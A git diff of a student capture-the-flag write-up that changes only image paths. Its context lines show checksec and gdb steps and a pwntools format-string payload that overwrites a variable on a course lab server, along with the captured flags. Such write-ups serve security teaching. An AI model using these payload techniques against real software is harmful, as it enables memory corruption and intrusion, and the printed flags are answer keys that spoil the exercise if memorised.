@@ -55,7 +55,7 @@ We will now be analysing how _main.c_ behaviour works on _program_ (which is _ma
 checksec --file=program
 ```
 
-![Alt text](./images/ctf7-1.png)
+![Alt text](../images/ctf7-1.png)
 
 We can see here that here that the binaries aren't randomize(is not a _PIE_, Position-Independent Executable), but there are canaries, which prevents buffer overflow attacks as they will be detected
 
@@ -67,7 +67,7 @@ gdb program
 p load_flag # 
 ```
 
-![Alt text](./images/ctf7-2.png)
+![Alt text](../images/ctf7-2.png)
 
 So we now know that the return address is **_0x8049256_**.
 
@@ -86,7 +86,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-![Alt text](./images/ctf7-3.png)
+![Alt text](../images/ctf7-3.png)
 
 Thus, the flag we get is **flag{a36ac6c2b6ecee59b102cf406c2e354d}**!
 
@@ -98,7 +98,7 @@ Yet again, we are going to start off by running:
 checksec --file=program
 ```
 
-![Alt text](./images/ctf7-4.png)
+![Alt text](../images/ctf7-4.png)
 
 
 As with the other program, we can there are cannaries and it is not a PIE.
@@ -119,7 +119,7 @@ gdb program
 p &key
 ```
 
-![Alt text](./images/ctf7-5.png)
+![Alt text](../images/ctf7-5.png)
 
 We can see that address of *key* is: **0x804b324**. Now we must convert 0xbeef to string format, which is 48879. Using this information we now alter the used the previous flag exploit by writting 48875 (48879 - 4) '%n'. So we get:
 
@@ -132,6 +132,6 @@ p = remote("ctf-fsi.fe.up.pt", 4005)
 p.sendline(b"\x24\xb3\x04\x08%.48875x%1$n")
 p.interactive()
 ```
-![Alt text](./images/ctf7-6.png)
+![Alt text](../images/ctf7-6.png)
 
 Thus the flag is: **flag{6ac96371637acd9b27d93579d9cbb888}**
